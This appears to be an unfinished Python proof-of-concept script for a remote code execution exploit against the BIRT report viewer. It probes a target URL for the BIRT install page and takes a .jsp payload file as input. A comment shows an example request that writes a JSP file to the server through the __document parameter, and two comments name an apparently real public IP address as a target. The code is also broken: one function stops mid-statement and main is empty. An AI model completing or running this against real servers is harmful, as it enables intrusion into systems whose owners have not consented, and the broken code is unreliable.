import requests
import socket
import sys
import argparse
import os
import urllib.parse

# http://14.99.184.178:8080/birt/




def help_msg():
    print("")

def check_host(url):
    url = url+"/birt/"
    if not(url.startswith("http")):
        
        sys.exit("INVALID URL")
    try:
        check = requests.get(url)
    except requests.exceptions.ConnectionError as e:
        sys.exit(f"host not found ")
    if check.status_code < 200 and check.status_code >=300:
        sys.exit("server replied with a invalid response exiting....")


    if "BIRT viewer has been installed." in check.text:
        print(f"BIRT is installed installed on host continuing to exploit")
    else:
        sys.exit("BIRT viewer is not installed exiting.....")

def check_file(payload):
    if os



def main():
    pass    


# http://14.99.184.178:8080/birt/
## http://localhost:8080/birt-viewer/output?__report=test.rptdesign&sample=my+parameter&__format=pdf&__overwrite=true&__document=./info.jsp

if '__main__' == __name__:
    parser = argparse.ArgumentParser(description='POC for the BIRT RCE exploit')
    parser.add_argument('-u', '--url', help='URL to target with port number\n eg: http://hostname:port/', required=True)
    parser.add_argument('-p', '--payload', help='.jsp payload file for the exploit', required=False)
    parser.add_argument('-e', '--exploit', help='Path to the exploit', required=False)

    args = parser.parse_args()

    #get the actual arguments 
    url = args.url
    payload = args.payload
    exploit_path = args.exploit
    
    print(f"url:{url}\npayload:{payload}\nexploit_path:{exploit_path}")
    
    check_host(url)
    check_file(payload)
    
    
    main()
    
